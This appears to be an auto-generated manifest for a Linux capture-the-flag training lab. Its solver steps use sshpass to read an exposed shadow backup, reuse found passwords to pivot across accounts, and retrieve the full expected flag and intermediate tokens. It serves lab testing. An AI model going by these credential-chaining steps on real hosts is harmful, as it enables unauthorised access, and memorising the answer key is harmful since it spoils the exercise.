@@ -1,0 +1,40 @@
+# Generated from platform/labs/Linux/linux-3-4-hash-relay/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-3-4-hash-relay
+track: Linux
+difficulty: intermediate
+source: platform/labs/Linux/linux-3-4-hash-relay/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-3-4-hash-relay.sh
+  steps:
+  - name: SSH access as operator
+    command: sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'whoami' 2>&1
+    expect: operator
+  - name: Discover exposed shadow backup
+    command: 'sshpass -p ''{cred.operator.pass}'' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} ''cat /opt/blackrock/backups/shadow.bak | grep engineer | cut -d: -f1'' 2>&1'
+    expect: engineer
+  - name: Read token 1 from backup directory
+    command: sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/assessment_marker.txt' 2>&1
+    expect: h4sh_r3l4y
+  - name: SSH as engineer and read secrets.txt
+    command: sshpass -p 'security' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer@{target.target} 'cat /home/engineer/secrets.txt' 2>&1
+    expect: Bl4ckr0ck_D3v#
+  - name: SSH as devops and read flag
+    command: sshpass -p 'Bl4ckr0ck_D3v#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null devops@{target.target} 'cat /home/devops/flag.txt' 2>&1
+    expect: ch41n
+  - name: Verify assembled flag
+    command: echo 'OCR{h4sh_r3l4y_ch41n}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{h4sh_r3l4y_ch41n}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
